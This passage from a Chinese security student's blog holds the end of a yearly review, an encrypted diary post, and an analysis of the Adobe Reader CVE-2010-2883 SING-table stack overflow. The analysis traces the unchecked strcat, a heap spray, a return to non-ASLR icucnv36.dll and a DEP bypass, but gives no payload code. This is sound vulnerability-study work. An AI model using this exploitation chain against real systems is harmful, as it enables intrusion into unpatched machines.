<p>课外的话，在Trump和COVID-19的合作摧毁了公知和美分的谎言后，开始以其他角度，（或许更全面的）认识某些事情，有了一点政治、经济的常识（大言不惭），当然依旧羡慕Donald那种能表达为语言和文字的能力和积累。<br>
看了一点《千年金融史》（真·一点）</p>
<h2 id="其他">其他</h2>
<ul>
<li>当了个安全组组长，经历了协会纳新、小组考核、开会等，感觉有空可以开一篇记一下个中感受</li>
<li>（好像…又再次坚定要考研也是在今年哎，冲！）</li>
<li>报了三个ctf比赛（湖湘杯，X-NUCA,校赛），湖湘杯忘了参加，X-NUCA啥都不会，只会校赛。虽然校赛贼水，但也算是参加过了个ctf，算是感受了比赛的过程。</li>
<li>上半年在家的时候，在网上教一个人学c，并浪费了好多时间，后来第一次产生&quot;后悔遇到某人&quot;的愤懑</li>
<li>依然没有对哪个妹子产生过想要追的感觉，有时候觉得现在的日常安排挺充实的，为啥要多一个人出来干扰（…），毕竟连买/白嫖了的游戏都没时间玩（…)</li>
<li>入门了网球</li>
<li>过了科二，快要拿到驾照了（是没啥能写的 所以来凑数了吗）</li>
</ul>
<h2 id="Flag">Flag</h2>
<ul>
<li>看完《经济学原理》（两本）《两次全球大危机的比较研究》，（去年立的“看三本书”的flag果然没有达成，今年就更具体一点好了…）</li>
<li>背完考研单词</li>
<li>复习高数</li>
<li>看x86汇编、从龙佬那嫖来的glibc内存管理、csapp、操作系统、0day2、漏洞战争</li>
<li>打几个ctf</li>
<li>早睡（…)</li>
<li>坚持锻炼，特指开始jogging</li>
<li>去西北或东欧旅游（如果能的话…这是去年的flag了）</li>
<li>继续买基金（12月底因为懒得看，把手上的基本都卖了…</li>
</ul>
<p>over！</p>
]]></content>
      <tags>
        <tag>年度总结</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2010-2883 Adobe Reader TFF字体SING表栈溢出漏洞</title>
    <url>/57740.html</url>
    <content><![CDATA[<p>Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING（Smart INdependent Glyphlets）中的uniqueName项时存在栈溢出漏洞。用户打开特制的PDF就可以执行任意恶意代码</p>
<span id="more"></span>
<h2 id="分析环境">分析环境</h2>
<table>
<thead>
<tr>
<th>项目</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>WindowsXP PS3 32位</td>
</tr>
<tr>
<td>调试器</td>
<td>OD 1.10 吾爱汉化版</td>
</tr>
<tr>
<td>反编译器</td>
<td>IDA6.5</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>Adobe Reader 9.3.4</td>
</tr>
</tbody>
</table>
<p>注：根据CVE的描述，漏洞影响的范围包括了Windows和macos上，9.4前的9.x和8.2.5前的8.x</p>
<h2 id="漏洞分析">漏洞分析</h2>
<h3 id="静态分析">静态分析</h3>
<p>IDA反汇编CoolType.dll，易定位漏洞<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414202752.png" alt="20210414202752"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414202821.png" alt="20210414202821"><br>
注意到在pwn题里常见的危险函数strcat，且在调用strcat前并没有对长度进行判断</p>
<h3 id="漏洞样本">漏洞样本</h3>
<p>用二进制查看工具打开书中提供的TTF文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//TFF中SING表的入口结构</span></span><br><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];    <span class="comment">//标记&quot;SING&quot;</span></span><br><span class="line">    ULONG checksum; <span class="comment">//校验和</span></span><br><span class="line">    ULONG offset;   <span class="comment">//相对偏移</span></span><br><span class="line">    ULONG length;   <span class="comment">//数据长度</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414210833.png" alt="20210414210833"><br>
再根据书中提供的SING表结构，找到uniqueName（BYTE[28]）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414211429.png" alt="20210414211429"><br>
即strcat后，这个部分就将复制到指定的区域</p>
<h3 id="动态调试">动态调试</h3>
<hr>
<ul>
<li>注：在调试时遇到了一个问题…Adobe Reader挂上od后打开任何pdf都会发生异常然后结束运行。百度后发现是od调试选项的问题，在选项里加上最后一个“忽略指定异常”应该就可以正常调试<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415212329.png" alt="20210415212329"></li>
</ul>
<p>再：几天后在看雪上也看到了类似的问题和泉哥给出的建议：<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yMTI1NTYuaHRt">https://bbs.pediy.com/thread-212556.htm<i class="fa fa-external-link-alt"></i></span></p>
<hr>
<p>打开OD，加载Adobe Reader，F9，在0x0803DD74和0x0803DDAB处下断点，打开能触发漏洞的pdf</p>
<p>F9运行至push “SING”后再单步运行至最近的call函数，<br>
此时ECX指向SING表的入口地址，进入[0012E4B4]就可以找到SING表<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415214856.png" alt="20210415214856"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415215446.png" alt="20210415215446"><br>
可以看出两个断点间代码的作用是判断SING表入口的有效性，并把uniqueName的地址传给EAX</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：上2图不是同一次运行的截图，所以地址不一样   </span><br></pre></td></tr></table></figure>
<p>F9+F8到strcat的下一行，即发生溢出后，查看此时的栈帧情况（看起来GS至少在WinXP就有了）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415221211.png" alt="20210415221211"><br>
此时返回地址已经被更改成了icucnv36.dll，通过工具可以知道这个库没有开启ASLR</p>
<p>往下运行到0x0808B308，这里是一个进入icucnv36.dll的call指令，跟进去看一看<br>
只有简单的三条指令：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415222508.png" alt="20210415222508"><br>
调整了ebp</p>
<p>运行至0xA82A714<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415223734.png" alt="20210415223734"><br>
而0c0c0c0c处的内容为：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415224754.png" alt="20210415224754"><br>
可以看出是一个堆喷。</p>
<p>后续的操作依次调用了CreateFileA、CreateFileMappingA、MapViewOfFile，开辟出一块可读写可执行的区域绕过DEP(NX)并写入shellcode，随后执行shellcode</p>
<h2 id="流程总结">流程总结</h2>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415225645.png" alt="20210415225645"></p>
<h1>后记</h1>
<p>调试的第一个RW漏洞，感觉比想象中的漏洞复现复杂一些，并不是跟着别人/书里的步骤一步步执行就可以的，还可能遇到一些环境的问题（which整了好久，感谢021w师傅的指导orz）和要琢磨好久的点。<br>
がんばって</p>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTE4MDEuaHRt">https://bbs.pediy.com/thread-251801.htm<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly8wMjF3LmdpdGh1Yi5pby8yMDIwLzA4LzAxL0NWRS0yMDEwLTI4ODMlRTYlQTAlODglRTYlQkMlOEYlRTYlQjQlOUUlRTUlODglODYlRTYlOUUlOTAv">https://021w.github.io/2020/08/01/CVE-2010-2883栈漏洞分析/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Win漏洞分析</tag>
        <tag>漏洞战争</tag>
      </tags>
  </entry>
  <entry>
    <title>不定期日记</title>
    <url>/39190.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="90e2b104a323497263bce923b9a2c89344e3d9c23846aaa22d3bd8d635d8368a">b1b250969afa51836c7c9d63502f3b153fc7e4013c075ea047a8f6d525d4c31772150728ab5c94b81eecae0661bd7f94db16d15f9e6ce71f16ecea40d01365e7bea8f9798283270051bd92be693a06ae758a6347af047bd18515a04f568ec0373dd92afa8f6b2bc70f245c4ac1298d7283006aa674bbac047d79d1655f8d25d5ca5376f6293125f2d2f53ae4819bc685c515769d85ff21cc0a223f5a3c4454e17f84a036e7b07d930a5385b2e09812d8d5040197c3bdf342807debce94d8169f4551a05c2072f50b6696fd7dd77a50a3c3e2b3e2faecd02ec840e3bac6a1ba783d2de5843b1f52af379517e1938c4bd6446f01bed80974c85c36e2f0b6422ae144eec8071e41f3bf82007711c7642c02bfef43216c90850b78f44701803cbe3b8ce6f74d4773292ffe3db8f662bf7e8ee0ba5cc51d95457528284ce6a4d2f217f1bcaaed14418c0b3a4c022fc89b54908e45ad6acb206d0acfebbb62921553faee1c078ed00947afaee048e6f1ef0d08fb0cef94f7b96f2e6a926ad80e22db512a13d37a62919e03b6826b7d47b5841f3031dddd097ce4e7e0e0cfc35c47495e6806b87a54aa1fc2daaa112035976bd93514a2650500238e70373fda9de4f3d9ad356dc155299c5b2f57ca5d219d27d0ca60f1274d97701779a452ca93cb79d8654b3f5fca2d9d320c1d6c2be9093778e4abbdfb87959edfc0735e505a54e8865dc6e33f766a7cb5ec7c6e4ae3da30e2ff31ac21e1c752777201aa41cbc52607d2ae1d354b35906e489fd8808b3f8344e87eb65342aa030953415ac02594006d2c22d15f91c384917b3a28d9b3f3105a20d415d7590b6a633f13361e5587428a17ff6cd69578e54c43a5994ee5119a75e8edc3a670cba20105bb7077ba869ed3da70b10c1f39a5c2f0f5784b72972012c09c636cd981ab514a98a84e8f3c7b4fb50d118ca82c0bca31894184aa36b3841fc38a8000d5981036b35b8a07d933a4efd9020fc668b01b00de353f47b47fc9a9bbd80eb6ebc2a705cc516106ef83d4de94abaebf44872e4dee09d533bff75807b8349dc988d7ea80402fa95586ccea10235f36319736594fccdbbd0a46823e3f07671d863980887b3c866f418e038e0eed005221429e5c40ccd52ad61c53c8347d74e35934819f0e4df21608f658830e6288e4d87bc2569e4610865f82fc4eb1059a01a4c63309f6d48d79af6938d2e66e6c4df394eb1d8dcd6eced7d1db50b9d437fecc4560c847c1178cdf1fc9e6911e2d30ff10fcde64043326b7a0ecbb59cfa08d6d8e03a3e6e56405d4735e5a026b02ba21eec3930b4b7afc936e339ea7f8594196030df6c674a1be77f1ef723eda72e449aacbe2aecdf3313c5c9603a0a78dbb86a8e88fb519b0e547c4fe253fa82ce14184678fa00eec40dad2c46135ec80380718bd9f88161e879f42cc74812b09c40666e98fa29f203f463eeda393cf623d2ddad33f19211bdfd5a9c067871d4e656f53c16a3db18bf00f6a015b79a84109417926cc6855ba11da106092a07cf902834c7d53713d441f980e07a3e2a1d7a6b72a16b5b95f72a0bd3da9b45a9b6a467151222c42d419f3f4b735a9f91fb0b7760a7c32ecf0dd69177ace71c9ea982b5e2d6a210d6b6e85884f1a8084efa4b772f55131aa071a4f08dfa8df261d15b9ed9ba744a89e5e7b96a52fd2a3f1058ff15d16a7a75a765fe89fceb85fe5bb401e261b39445ee8b50ce835cca7de7eee6b7392f08dfa9651c000a5053fef122419a9f1657bc83bd1b0931e8832fbe91d28b7775a7515d0d7d03e23e9882ffcb03e9bb68a277fe69d416f0ea7b29615f85ee948e8367d2145863aea667e10fb0e2e5245a391e8840d2d39d9f02df19cf9ee986c543f9484fa2ebb1dbba2747061bad2d499523e66a64afa419864fa8454da64cfc76c37730550932e2c062fe7c2b7adcbe376443911cfab3db6ce62d8f0e8dd580b06e5072cdfbce17971ef3acbb8e6df45e89a99ae1b35b80f54caaa8a2d87619002ac2be59bc3591dd440edb16adc304a11efc5df749e6d6eaad69261ae7add7fdd5cb08215bc239647d760aef8ca2d5e9f7fe923fa7118e2962129bd3ace02f0991f8e317ce9c304dbe7b98b2aa6829fc19ed32b843540aa83f2c6a8c953fa9239ce2fe625168c20227d838d4965b7d54dfd97bcc2ce591935ca6bd53f4d3a2e3356da5ebe9b6064f8178fe121bc5894c440b2c79b9c0bfc228c2f836cbfc6abcf8eda12a8ade6e8cd1661edf68dc46d112a869e292e6518d998ecf7b84ab7d30556e10780c3b221b253e09c77880f23fcd6cd43c85b833c2afa96aaf44bc4cccc6e2e880f869a68b10055779f8af317e9978ecc1ee3f6156d5cabe62e26d47d8fd7750ab3ef3b49bbb5b6b5a2974a47847c0ff8e2aa5b0248b5a1ea33eeccf865db3fbfc95c5a626e484edc9cf2ea579d3653699fe6d36de730ee2d9e722b8b9dc6ed77ee67ef9518fcb82e2706f23adeeed2aa9553a19997bb6008991758a628f4cee3233a89b5af23c9569886a90389003ae54d9a2608d0d19927a97aaec62f2ab86ac046b2220dfcf8223f7bc26b954c44bea9c10a6e668ef77bee708da34346ebc571cc026df6c01bd997f7f228c94b61b9dfd65348bfb1568023f92e5f644a48f949da9b72cf469a95c92e2cf183882ce435d7b3eaa740019c0b9640243a791581fca444f3e11367ca92322520c9442404094da3060f9fcb949f08392d210602238aefb724daebb6bf7043188aae76208e33534ea77d48715d400a0cfdbe6a0e64010ff3a52688572fa6eb12d14caf33f88409c801c41868914788556232b446a6655211fa016c8349115380457544e10b19abe43f3a69e7a9b69d9a949457ca3d73aca8eefa22f163c26bc7d0903ea03e5916b639b1e53dfc4c9ac0bee62a789db8eacb4e072ac6bec75548a8b141a3f683759c6d90595822807694a37fc276d14870f938af88e02246a8a09786af75b1c8594d0ef284383385d6bf4ee2c915930c476e2d067d470b59c999e07d9feeab60501d012a4f18b52e6dc3d6e90558dac7ebed2c14a470c8a2cbb7a48ae8ff8dc11e1cd44a4bb5f38f574da91c4bac8aaab72fdff8e58a80839a67065b84b23d2a056adf1009fc4cd7ffd4b78e11bc22f3863ddf399c0ba36783e710a27f6740d59106c27db438c58838323f485673d1e046687af3bae677b52e3125ce103b51d6d8c5f05c43c3e04566a181eb2d8b382f1119f21f33e8f676a4a032efa33e11dbb68d4664a1a76b16198bb7ed948b3d9cb563a16df045cecee927c2f1acbdeec333cc042e8feca4ab828a7683f6c8dac327d91d36921ed72a6c8b5961958a27707788d001aeee35784407b56263e1a5546cc45fe784e65df3a95e64e27396c59a68f89620ea7a03fee4dd8f72d1ea577aaf0dd3412b40f1edb2fdb0074c785b03aa3627b38203e4906cb9f7b5bf6a8322bf82e19be51737cd62c109922bf483517deeaacb3de20bba393ee47e3b6625d300043f15fec26a358a5891d785c9482dafca1029b28470415d4f2d5dd30c1bbab07d1a27ac7c80b5efc4fa77457d8cb83459cdc887ca3953a085e40732e1652ea3a6fdd0f07759d51e8dabc860efb85582c00fa02a9e56d5281a4d852f2369f5552dfd7dcc27531733a9bbbd3cbf549ad04ed8e439211a79d31b302c1ee5a08c3885e62ab9d7e2497dfbc8e47b214a66d8976a847fa52b196c884a5b6881cb8f7b761bb0d7a98f174fbb0e77df0366a9f7204c28416498fd074a80e41054472db31b72cfb8d25839216d3c37af3d9643ba7ccf2954c7bc31840725561db4ebfbb17ee76a3cbc247fc315c497dc40627b38d2164d0de46ba7a9ce01c34a5ac4fca4a75640a756f13ecef367485ab6dedea58a201a37c9c30b3a0a2fa5e06a75c4f9db2993754c994e4fc3b1f1f4e756fb5aaabfff15dfb24c9e9b452dff0bf18c67da65489b74545c29c0315b4b5f678f0bca28241d121d7e497fd8f9cae78e6a73c1c70c175d3f84b0ee45441c0c8f10216a3290d396c71b49ace19556ad3f86701e2691ae7c46083176b1dceb94e7992667af2b71633b47b256e94ef376683b67b6bb7aa9b76836553292ca095bba4cb2ad2686f94f30ad8fcccd0ec480def20ddb533459980f8b6baa3fe4585e972849f9f51e964926323d1e5f38a2d0d97d0bf22aa501279298617994231788da39b6decbb9e8ac27f61c4daa1af6754dc557f8ae2c27dbc57cf5ea03704f8b87b8d33aa58c5d589308978940d7100b8a594bc86aaeda2bc63c5462038c075d30d06d0c5a001990234d7da3f21a95b8c60315e979969a0639dbb654fda07a920c9ee0ad832ef2ae7a184ec38471d68deaf64882486b26f7cfa039f0a77c3c519aed143d8affc22acd0625e30ab5ebf37111881ad08d36594114a6102932db032735e747b000c6d98fc536566c138c71fe417aa3f6657f6aa90ed029f70d8a9e20a18b861da29b2a0f5ba4fc5a23425d8b629fd1a2bfeb2163b5c3edbd64ecced6105abdcb38bfac830e22d52521277fb7d39c9daabf4fa30c5683e48c548e554fd0d5f8e17181239fdfe3669cbc995a79a93ca5e4b6739584429f266bd2eecf993524ce9ffb7975e23563aa1609c763a4a1ee53bd7c83c6af6917dc2d9f2c95036aab076dd20166cc02e050b4373565222813ee2b6d7993c18285e721b3c6cbf3bca420b747a2495984c56323b93cbd607578ae31180fc244e46ad4d8f02eacc0d0131e6a78ad8ad1e8bd15e825fceabc5e5be26877a3407028a12dec39ced05194417d0ae848797091036a843c85a41f8c1bf124df732d43e8c73086266d0bc47420481d80ffcabcc1153cc07f1babca003be5844f7d686bd35c4bda91393aaccca86753c3cb8180baa3ccac62460a49a9e789d2a58a4bddf36ce162dd3028ae18a18183226aeab3fcb1b66851222b36f74e0135cf4f668897e368af039030ee8612bf3037bb3a412efb90a257844d96dc3d8b44c8ada8f1168565998950d7b6076a28154c36bb9c3e5ab16aa057f7ed4475396a2afa0dce8d09983654b7b42adfa9934a62d4125c0b4b1ff417d0b6ad00ea56266faf10d49938d030f7714e6049ea86beaea6f3915a557c4c00f2d8fb787f6b42026fe50fe2346dce265ec07e3f06c45ba2e33439038ca754c97e11e233bad91aaef7598a6d38c65d507770627b3bb2dfd0a33a29b27a8846299e5a8d4d9e2f9fc1f37a15a46e4ef89f8492925667fbc5a86f1f4879f698b56d3466b076cea6d3576a902d10f39ecae73fd65a470fb97155b239bab373555d7d4ac3301f4e8dd835bc194603f2ff9a5de7579f46b4242e771828bb5b417fb7b2b7c0e3299ca8c80085642a00b50c21d8460284118f1f119e4d761269896026a7347f4b55654be36d03cc51361107d8fac395848553e12ffe8f1e92c2ac4de44fb0f3cf54472821ad1981a235fe2f971ff59d24a4d8603262a5153d7d49cfd91766a3f40c9d15f01a8248239b081aa8d7df0c66aaaf6658ab652bb8fd8cdae4c60dd61f95f6268e61a8eeb0ace309a5c1ee64fab2c2a644a00d7dc1778d435ec5121f439b76398333a274ce97a7bcf13943f8994d22cf71cf66e83cec350f7d01baa3ce95f5e94d7abab5e94949952108059c190c2497b1e972ab5d487687fc2c7aa950b2d005b2990c3b96c2b7b50700fb79e34e6405ac123e63cc0d1cb9277610be3c3f25e64e00bf8c65b6174a3bd1c243c5a4ee8a791ce5c0e0fb3aaca5bd8468448e781e883e492b6e26398e323a3e13ce918947118e738f7021b120f9cb75bebb555ab899554f8059998455cc4e2d3cb74e7ebae046d18c458341c6d02adda3e104b7e85e61bb7e3924e99f6dcf64133bf94003c582295680aa1249ddbe54020bfc2fbb5c96c92d243a7f47481e7dea5c6dd8fa8afdf753f63b65261b54df4b3358929597f2a46fb8de8aa501588f60b6e2e198905798ec39977b6fab8273ccf064e2860d10657c97f02e84945c5b2a58926efc5c0e1320892e47587da015b83aba51704442193ecb2031a7ffc00a33fcc3d0977956de7e2fb9aa4241f1fdd9c59c8f711429eeeaa1806c75d0147897af96260b693cb622bf31eb093d908f2d4e1d2e2d6a0432722c821c0ec88ab80630a09323b92ec49f91a32c0480c6057266ba2cd9bb723a3221a522dbff83a36109e7d11b2686aa0c4f884c7b48bdc7d1437f6aa94dec4322e637a9fba58d914391a285f0d856cab0b92127cb6cbf665c6a27623c298e636ca4e80b341386f1b16ca326b086864cbbfc6172d8051da1c0a9cb2486ca256ec4e69938c0a3feade0ca74d26d202098329b543fca44bf7c9e32618640036662d33ff582ff135e8790a8b9a9c3af24707e890a0739b0a2676120bd6dddf2f2cb0d9ec5d859ec7f36b913ef90d0ae3b145873505357b42b74ecef24c373b180b1db60e14690e8eb0c9743ce5a62db6ef142fcc224a96bd095540aaf8d08b65a3a89740a3d7ffa3f981ecc206b9182efeba252ef3c74a46bd207cc279b13dd1d86edcbee3483a2d6a77b3faaaf2720eae1374352ab7044739d680db3dba139432e8afda03200ca8be014bb03bc4db86a1aa87c5c9c7a4e3a46cae47fe3fe10bc94cad7e81e922180479aa1e3add74a1728a117b3ad7fb073f781366efde0cfc25ad3d85aedd3b0c423c31d32685d0117c70493d5d1efe394e9542acedde8c49d9be063d492d137b3a5a55d80bd759a50010547dbf6b12b214c3374219cafeed246635d97692d8c02245c3e84261d03e15f2c6383fc4218f569a93f4e59df89579652f5f88a65cbae21ef01085658e5bcbc031344915aacf27b67e6ad28041f26db32ab6b645351859616daa6f612b9b52112305347f8eb05f818771f1627ef70d0ca109b6b3e4fd34bbf13305fe4ad716b2635c4f4932fea1e014165ec497476c8b7778f085640bc3b4086fc00533b9f0e4d41b71db6052ac5fdd35d7ae9f5639acc095dfb337c5a706599001dd33cc5ae27b409bec13e82b3eb8b09b4b4a51cc7a1156cb42bd17b791c633dd73d8e37992176ef987e6b755037dcaa20e7c22f8065dd1f5a7c8e88f2318b3a022da1fe1b52cc4f0420c95496bc675485e9cf3b6049a176f1690c0937f53842605ee4bb13c0acb8e7af94600134f29addccd385d417d569083cbbd802da6c97f8733595b0e32a065c9750708ec3dc2f9e33825479709c25e6c19ec3ae723263dd6e28c49f7ea1a6f6df688308ae1421d57b29b79fbbb3e011941382480df3c62f647052a7db893c0c9a90422c0a0c7d6bc20d6c068b4e89e89150fdd4bda93d3279310b2194ddd3b38f8710eea2c9173adb57288cfd7fd270df0c0d524258a99c036a6cd1330c03492f603883ec9e1daafa50b8bcbcaf889d6f1d5c782c555e45caf6c447ad6ad905a7e0b9822250a6d6154ee2fb22e14e6d8b2818316d464e88544a6fd57dce70518e4db8d24eea1a57d86fe06ab9e60bf977059cb507119b8701db26f44b113d548e9d1251e1eaef6108133f1cdee3fbe149bd7888fa94d173fae12bbabd83e7b34a85fa424857edcaecd9c4c0ad4fcc3565758f492b8b98fdcaa11cb0e03cc91f73655b53da4ae5b47802d449b35012927bc416efb8aea30120688949b27ab0c9aa76ece4cef23d11f99a956cd935cf3c23dac4d0ae5efab43e97d2cf5a4adfd5197cfd7cbc4122d2a50e0a51909de19921506253b8bb8f5441912719c2611f701c17b7ded0b6f13cc639f55990804d8858aa812f24ce460f9e1a3e8c4678728f70aaa133eb1f1ac98a9b67a703a2ca52b6c99abd74f0d4c7577d919f4c57e1bdf5bc69d13a6a5c809a3c57757e569e6e8b0dedf9a76542a87cb314412ce4bf9626e107d49527b8752c3f8bb75c08529597d5a62b08718a05f77277699c392df96f6b98ce61dff5d18d5ce1841446275ecfb56e5191b984458df0e5f7e09ab57ab02cbd5014cb1f2025fcad26e145036d0d4fae52905be357e4f3ff4d52cb09cf390a81f6d62ab85cfef31391717437686338350b0254ddb3bde69feeec51eb833c89c10e00084546bdf60feb849dc7cef6c59365c6d43df1f3e5f22a2bb7e5fa114d3c94520cfd780f08e6287fd44fdd766d70c272e0211b5c3a63614ba7a6ca4964a500390b052c1ce60c1ba4f1f94fcf909b9b8989bc4218d7574716208553631989150129931b8aca16a3c859981672b78fabeb97835555f76b2b2c5eb92828027a3d8ec966b8bdf4bcbb1bb59a86598201d6df9e90140fb87023bda4c29120e412825536d4d19d4c95aa62c3bd8cf6b4f0b72f36f199e50ca5f9996cfdd839f25d7c68211e2bfdff724e41a0cc321f83516f5c7205c1c423ef813ee571026dc43d81e539a7c2c402c09c5f187712eb5a94bdcc47336704b92fe5f65b796aacdf908621bbdd9ea275309e1e234d42d8cd56ea896e3aadd75bd345e7ff4a0d420678568d65148eef0d6dcddda33c2d1d529c09c8e2b0f839d5eb574613d1665a03f952bf77fe825591efbdd78b67a4d6997f45b1834b1b57ea8fe441f5ed32b17f77644d3597b1691e4339a9010856c266b7e1c105f87a516ef1587f37424bd71bb4a25a316161210fdc3b5c1a38a8916f43213b7370a92c61ed3ffbbee5aa470f750b8e7be718e26a04c76c6cba75a2b165e4f6df5179c4923864dcf4813009391bcf29b90af6521e0fd517a4bc3508bf444480d98cae519aed0488d8d4e90d39ecab8e908ff2c86a794b33fc4c567a040feba23b4939eb88a5c1f213c3fcdd750df4de34ddb8f04e036122cd9bafce1d21d278ee06f9c87698552d6b4d961370e33b7e26fda4a56a220fdc69eab61d8f9a939f3c64bd2e403a42d2b41b6b712f68c92c96ac9e5e3c902f194160cf3e69b2dfc8cce0ca9e94544ef1609c383f0d18313e65334434b7e45030ef372dd84a20e4832b2bbce74892227ddfb90d5a38eb88ef1cf3baad919baa771b387f1f81bd99ed5f6c48632bdcb855b8edfd38f1c2db45f192908513f50529226d90a46408364e467f7f3ff953b677d2313ce2212d0221a4c952ced1b80c0ff8dc66969339950b77ee0955d7300bd8b5e1733e965b187b66b96681e3296991524e859be8874c6d192b0f9837fdfee1ddf26dec50f14f862cb39f8c770dce2e69b8d329b3af359f5d9487b2588c395b4f12a7ae84c89fff2694b2deced27ec71146c3a0373d8b1d7d21e537a68c6b797853cfd0d67b8e93191994176323cc5038944c9352560f26a45b8d9aa2782e4786f81cde5009583e2d13a077190e8c94a651f56f03a55511769d9d8bc49292a3c591d993133e63f03a984756941accd5438045f499b9923a616e982000e51dca8cb6c36aca271f2ac9b67bfc46457c9b7548caa3972017155650f2eb2dfdedb4a207b42057f8be871e71833769a665a427427685ecc6e1203a47bbfc914fe01a58dd1615ce2746ca00494e01f30966a42d6824bd78f4bd81623302d168bb730fae0c8bfa93707c6f8cb408b7aa3ca59128d93850daffb350466f7c8713ee8248c813677b54f5fe4739d7bfe3fb0d2be94366fad38d9922cc67510a98e20bc486a37ba3afc41a2dcc19bfdb63b7f1b64f34c2321ab166b6998c1d547b234e742560065e7719d040992a13ad4a5e821ce128cc2a4d3d2e0bc7b2efd3d97c26be1b921f44df689b9c2e8b3d75d8172a6bcc90ec13aeda0d5988825314db3ccaecd2ad5fa84685354b80e35cd7f543ef3d64c9031869089680aac67c284aa15f65225abe715d9c67f2afa24feeda2b3bd9c9084c0f4c1a5ec6e44c49cac6bea85382087f4ae2f5c60ed8295cb768a8e469fc517cc1f359162448154b2e47f66018f72a4da0c3356b43ce3d62724e4d3f14f4ec954e8af39202b3a4272a870a40cc0cd39c1c34545486d68c6544df5232b19d8b1f6af336332284a5b22122c31fca57326e8c06e6b39e8bf3d838c946b2a9364a978ab957a3b108a95981d0ec1e1b31c669f1d9aed7e4cdbb6199b30facb67c87f351ccd5370d62dff647957d8c8e690d9c7e75e55de7f219d8c74be612efc70e4dbf87c76c372adda191aa101d93f75f5db296b721e8ea7bcd7e566d9786285531fdec9aa7e25e61e972d9df7338be406b50f06a4430360e3693c5509379c73710a306da4c5a92e88812e42879080cdac77a8ebc3cf603f4745b49e0fac42fef78879fb18fc6a50df7864ae2e364f2f8147479b1ed1804f00aaf4f799b3007ed1fb9affd066192a14fbeb86728a9846e352f121d9760f5e9e5e35d1d8fb0eb7b122739b983b049bfe11f5d30dda4f76143db133b9594b70fc22b6b2d53f4cdc06fc3ef54a7d7328805b5d8ac4cc7c3e34e6e0e1b1f9e709cc3ec3ed6fbebd8392496a6da10f0118359b6d482169e1c84bce4efabb9c8d0d5fd0a663ac6dab3d46af2fd5472489f0ef83cdc9b1195c655b529ca646adcdb765c029355c55dce4ca76882cfb3a94d31b1c503e6e216e9f5cbf980d3fc9e7d8b0447f68ace1561df9c46b3cdf5be0aed55cbad3d7b9519cf89a6775312ce75aff5b65308f08c5afbf608ee3ddfaa89e338f04725a4a0acf09dfdc6dedfa82b85ae8187c5c44b4a0746ab189ee81fdde33dbd7ba6a399f73f4c8de2f60659f7e259cf5993bc29ba8063ab1555ad495bc428f98cf06b001f4ac30a7bd389f092dd5cf9d330bd768a6fb7617877f99bccdbbcb63d5b7b76c4519297d21952ba70f23260f063fc4347e2615a6917c63f19c09fb0c25106ee649503d6fb0358525fce1c1847549a1a331ac2dcf76bc02be6f32856e0e47ee469924b1fb8ae9f13a3823906524dc656441b4d573fa5948400834478349f296a896d78afb6cc9226a74198d7c31274cdb7e16b5230863f0a8025e6ca32403ed111fe0b6a0d89b0626457e52848a36648661bc00ed2972c9d1d9715568775eb3f4bb8b1756a3d8c0e3f3a1a83766b43d3e43704f7ea28407d33d393dcc0670f82ab108d273fc0ebb42ac5e5776275bdfe9b9b4f38f49b178de407e2d2b671384aade7829c4cb504dd89898a828bf2a092fe26adc9056e243571a6dde9b3aaf38229d8d5e1e56e536004f7e4b011505378241f2d23b1774d0e324bc51d99404be92a433dd05f178982427077eacac1fa332d868b1418f8412b670d66e9bf174ff4f54c122dba67d2b7608166e560c3a736da7818a4e897d26287823855af41a9e5c2c28dff94678e92cb984d861b14f42bfb21157acd7b5dc5e14771c1209319d8930b1de8804e9fbbe52bf52e93c541346a0d07a22457b340b37a9617c6e2931e3dd1482906e387f29327fbcfbe7855fc5bf31fddf7de613a803c4ccef32061853e4b4047c1bca09b3c0ed4f4de383d11eee8b73b145866b9d20eb5576434f29dc820c10e20a4ca96a4f00aa067afb7bd24707dd74eb9f2c7a58f484eb7ee62a82ae08edf2fe4aaeae40103fe844d4dbf3d2f204bbde8d71708f278b7f637127ed61b3c027d78c1ea53742254e32f00ae3113d3a2a413639e6cd41cdeb0e8282d28b2207daa11e9504038ec51f17f5cbc7900059b6f8a9d7ea8cc2073041663883d1aa41a8b208beda6fd638dc4f6ad9a65592cbe90e4e3f3d45f9b3fed7534412aae94196829135d5cae1c838c5a6c8a1bb0b9992a6828d2d99d8266a66b27510c6398c2e98ee0ea7e181821ea4c5ac5fd6be4c02059294940e4cce714164be7686da134522cab0d28e6c2d19d1c557005783ae9d746131b6faa0f678a6891ef4827